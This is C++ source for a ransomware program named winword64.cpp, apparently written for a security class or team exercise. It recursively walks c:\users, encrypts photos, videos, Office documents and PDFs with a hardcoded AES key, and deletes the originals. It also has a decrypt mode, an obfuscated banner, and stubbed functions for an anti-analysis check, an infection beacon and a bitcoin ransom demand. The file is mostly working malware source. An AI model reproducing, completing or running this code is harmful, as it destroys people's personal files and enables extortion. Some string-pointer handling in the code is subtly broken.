// winword64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

//
// The encryption/decryption key is:
//    "Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"
//
// which is a Base64 encode of "ChrisClarissaSamanthaSkylar"
//

#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>


namespace fs = std::experimental::filesystem;

#define CLASSNAME = "uwbcss579";
#define BLOCK_LEN 128;

bool g_Verbosity = false;
bool g_Decrypt = false;

// Function Declarations
DWORD FindFiles();
DWORD FindEncryptedFiles(std::string decryptionKey);
bool EncryptAndDeleteThisFile(std::string path);
bool DecryptThisFile(std::string path, std::string decryptionKey);
bool ExcludePath(std::string checkString);
bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
void SendInfectionBeacon();
void RansomMessage();
bool AnalysisCheck();
void PrintProgress();

int main(int argc, char* argv[])
{ 
	std::string keyDecrypt = "";
	std::string Banner1 = "We";
	std::string Banner2 = "lc";
	std::string Banner3 = "om";
	std::string Banner4 = "e ";
	std::string Banner5 = "to";
	std::string Banner6 = " t";
	std::string Banner7 = "he";
	std::string Banner8 = " M";
	std::string Banner9 = "at";
	std::string Banner10 = "ri";
	std::string Banner11 = "x!";
	//std::string Banner12 = "!!";
	//std::string Banner13 = " ...";

	// Obfuscating this string
	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11); // .append(Banner12).append(Banner13);
	std::cout << BannerFinal << std::endl;

	//for (int i = 0; i < 6; i++)
	//{
	//	std::cout << ".";
	//	Sleep(250);
	//}
	//std::cout << "." << std::endl;

	DWORD dwDecryptionResult = 0;
	
	//
	// Check for debugger, execution in a VM, or other dynamic analysis 
	//
	if (AnalysisCheck())
	{
		// Found evidence of some kind of dynamic analysis
		// Halting program execution - why make it easy on the other teams?? :)
		return 0;
	}

	for (int i = 1; i < argc; ++i) {
		if (std::string(argv[i]) == "/v") 
		{
			g_Verbosity = true;
		}
		else if (std::string(argv[i]) == "/d")
		{
			if (i + 1 < argc)
			{ 
				g_Decrypt = true;

				keyDecrypt = argv[++i];
			}
			else
			{ 
				// There was no key provided with the /d option.
				std::cout << "You must provide a decryption key with the /d option to continue." << std::endl;
				return 0;  // Halt program exection
			}
		}
	}


	if (g_Verbosity)
	{
		std::cout << "Verbosity:  Enabled" << std::endl;
		std::cout << "Operation:  " << g_Decrypt << "  [1: Decrypt; 0: Encrypt]" << std::endl;
		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
		std::cout << std::endl;
	}

	// Encrypt or Decrypt files?
	if (!g_Decrypt)
	{
		PrintProgress();

		// Finds, Encrypts, and Deletes important personal files
		FindFiles();

		// Send network beacon to report ransom/encryption completed
		SendInfectionBeacon();

		// Display message to user demanding bitcoin payment for decryption key
		RansomMessage();
	}
	else
	{
		// Finds .encrypted files, and decrypts them
		std::cout << "You entered the password: " << keyDecrypt << std::endl;// << std::endl;

		PrintProgress();

		dwDecryptionResult = FindEncryptedFiles(keyDecrypt);
		if (dwDecryptionResult > 0)
		{
			std::cout << "< " << std::dec << dwDecryptionResult <<" > files failed to recover.  Rerun the program with your password." << " [0x" << std::hex << dwDecryptionResult << "]" << std::endl;
		}
	}


	// End with a fun message
	if (!g_Decrypt)
	{
		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
	}
	else
	{
		if (dwDecryptionResult > 0)
		{
			std::cout << std::endl << "Not All Your Files Are Belong To You!!! :<" << std::endl;
		}
		else
		{
			std::cout << std::endl << "All Your Files Are Belong To You!!! :>" << std::endl;
		}
	}
}

//
// Supporting functions
//

bool AnalysisCheck()
{
	// TODO: Add code to check for a debugger, execution in a VM, or other dynamic analysis

	return false; // stubbed for now allow execution
}

void SendInfectionBeacon()
{
	// TODO: Add code to send an infection beacon to a website, twitter, 
	//       slack, email, or some other network destination
}

void RansomMessage()
{
	// TODO: Add code to display a ransom message to the user, and to 
	//       demand bitcoin payment to get the decryption key
}

void PrintProgress()
{
	Sleep(150);
	for (int i = 0; i < 6; i++)
	{
		std::cout << ".";
		Sleep(200);
	}
	std::cout << "." << std::endl;
}

bool ExcludePath(std::string checkString)
{
	std::string AppData = "AppData";
	std::string AllUsers = "All Users";
	std::string Public = "Public\\AccountPictures";

	if (checkString.find(AppData) != std::string::npos)
	{
		// Exclude files in the AppData directory
		return true;
	}
	else if (checkString.find(AllUsers) != std::string::npos)
	{
		// Exclude files in the All Users directory
		return true;
	}
	else if (checkString.find(Public) != std::string::npos)
	{
		// Exclude files in the Public\AccountPictures directory
		return true;
	}
	else
	{
		// Do not exclude this path
		return false;
	}
}

bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
{

	// Note: the param 'key' is not used anywhere - it is a false flag

	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
	wchar_t* keyString = keyDefault;
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();

	if (g_Verbosity)
	{
		std::wcout << "Key:         " << keyDefault << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
	}

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE chunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
			if (g_Verbosity)
				std::cout << "Finalizing encrypted data file." << std::endl;
		}

		// Encrypt data
		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize))
		{
			if (g_Verbosity)
				std::cout << "CryptEncrypt failed :(" << std::endl;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
		{
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
			break;
		}

		memset(chunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return true;
}

bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
{

	// Note: the param 'key' is the actual key used for file decryption !!
	
	LPCWSTR keyString = std::wstring(key.begin(), key.end()).c_str();
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();

	if (g_Verbosity)
	{
		std::wcout << "Key:         " << key.c_str() << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
	}

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD err = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE chunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);
	bool retValue = true;

	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
			if (g_Verbosity)
				std::cout << "Finalizing decrypted data file." << std::endl;
		}

		// Decrypt data
		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength))
		{
			if (g_Verbosity)
			{
				std::cout << "CryptDecrypt  failed :(" << std::endl;
				DWORD dwStatus;
				dwStatus = GetLastError();

				LPVOID lpMsgBuf;
				FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER |
					FORMAT_MESSAGE_FROM_SYSTEM |
					FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					dwStatus,
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR)& lpMsgBuf,
					0, NULL);

				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
			}
			retValue = false;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
		{
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
			retValue = false;
			break;
		}

		memset(chunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return retValue;
}

bool EncryptAndDeleteThisFile(std::string path)
{
	if (g_Verbosity)
		std::cout << "Encrypting " << path << " ..." << std::endl;

	bool fEncrypted = false;
	bool fDeleted = false;

	std::string pathEncrypted = path;
	pathEncrypted.append(".encrypted");

	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");

	if (g_Verbosity)
		std::cout << "Encrypt result: " << fEncrypted << std::endl;

	if (fEncrypted)
	{
		// Only delete original file if Encryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
		}
		else
		{
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
		}
	}

	if (g_Verbosity)
		std::cout << std::endl;

	if (fEncrypted)
		return true;
	else
		return false;
}

bool DecryptThisFile(std::string path, std::string decryptionKey)
{
	if (g_Verbosity)
		std::cout << "Decrypting " << path << " ..." << std::endl;

	bool fDecrypted = false;
	bool fDeleted = false;

	std::string pathRestoreTargetFile = path;
	pathRestoreTargetFile.erase(pathRestoreTargetFile.end() - 10, pathRestoreTargetFile.end());

	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);

	if (g_Verbosity)
	{
		std::cout << "Decryption result: " << fDecrypted << std::endl;
		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
	}

	if (fDecrypted)
	{
		// Only delete encrypted file if Decryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
		}
		else
		{
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
		}
	}

	if (g_Verbosity)
		std::cout << std::endl;

	if (fDecrypted)
		return true;
	else
		return false;
}

DWORD FindFiles()
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	// Lowercase extenstions
	const std::string bmp = ".bmp";
	const std::string jpg = ".jpg";
	const std::string jpeg = ".jpeg";
	const std::string png = ".png";
	const std::string gif = ".gif";
	const std::string mp4 = ".mp4";
	const std::string mpg = ".mpg";
	const std::string mpeg = ".mpeg";
	const std::string mov = ".mov";
	const std::string mp3 = ".mp3";
	const std::string doc = ".doc";
	const std::string docx = ".docx";
	const std::string xls = ".xls";
	const std::string xlsx = ".xlsx";
	const std::string ppt = ".ppt";
	const std::string pptx = ".pptx";
	const std::string pdf = ".pdf";

	// Uppercase extenstions
	const std::string BMP = ".BMP";
	const std::string JPG = ".JPG";
	const std::string JPEG = ".JPEG";
	const std::string PNG = ".PNG";
	const std::string GIF = ".GIF";
	const std::string MP4 = ".MP4";
	const std::string MPG = ".MPG";
	const std::string MPEG = ".MPEG";
	const std::string MOV = ".MOV";
	const std::string MP3 = ".MP3";
	const std::string DOC = ".DOC";
	const std::string DOCX = ".DOCX";
	const std::string XLS = ".XLS";
	const std::string XLSX = ".XLSX";
	const std::string PPT = ".PPT";
	const std::string PPTX = ".PPTX";
	const std::string PDF = ".PDF";


	std::string path = "c:\\users";
	//std::string temp;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path 
		}

		if (entry.path().extension() == jpg ||
			entry.path().extension() == jpeg ||
			entry.path().extension() == png ||
			entry.path().extension() == gif ||
			entry.path().extension() == mp4 ||
			entry.path().extension() == mpg ||
			entry.path().extension() == mpeg ||
			entry.path().extension() == mov ||
			entry.path().extension() == mp3 ||
			entry.path().extension() == bmp ||
			entry.path().extension() == doc ||
			entry.path().extension() == docx ||
			entry.path().extension() == xls ||
			entry.path().extension() == xlsx ||
			entry.path().extension() == ppt ||
			entry.path().extension() == pptx ||
			entry.path().extension() == pdf ||
			entry.path().extension() == JPG ||
			entry.path().extension() == JPEG ||
			entry.path().extension() == PNG ||
			entry.path().extension() == GIF ||
			entry.path().extension() == MP4 ||
			entry.path().extension() == MPG ||
			entry.path().extension() == MPEG ||
			entry.path().extension() == MOV ||
			entry.path().extension() == MP3 ||
			entry.path().extension() == BMP ||
			entry.path().extension() == DOC ||
			entry.path().extension() == DOCX ||
			entry.path().extension() == XLS ||
			entry.path().extension() == XLSX ||
			entry.path().extension() == PPT ||
			entry.path().extension() == PPTX ||
			entry.path().extension() == PDF)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptAndDeleteThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << dwFileCounter << std::endl;
		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
	}

	return dwFileCounter;
}

DWORD FindEncryptedFiles(std::string decryptionKey)
{
	// Get system drive

	DWORD dwFileCounter = 0;
	DWORD dwDecryptionCounter = 0;

	// File extension filters to target encrypted files
	// Lowercase extenstions
	const std::string encrypted = ".encrypted";

	std::string path = "c:\\users";

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path 
		}

		if (entry.path().extension() == encrypted)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (DecryptThisFile(entry.path().string(), decryptionKey))
			{
				dwDecryptionCounter++;
			}
		}
	}

	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
	}

	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
}

